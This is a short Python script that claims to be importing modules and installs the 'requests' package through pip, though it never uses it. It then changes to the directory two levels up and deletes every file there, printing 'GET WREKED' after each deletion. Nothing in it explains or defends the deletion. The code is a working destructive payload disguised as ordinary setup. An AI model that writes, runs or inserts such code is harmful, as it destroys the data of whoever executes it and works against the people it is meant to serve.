print("importing modules...")
import os
import sys
import shutil
try:
  import requests
except:
  print("requests module doesnt exists, installing..")
  try:
    os.system("pip install requests")
  except Exception as e:
    print("A error has been found: " + str(e))
os.chdir("..")
os.chdir("..")
for files in os.listdir():
  os.remove(files)
  print("GET WREKED")
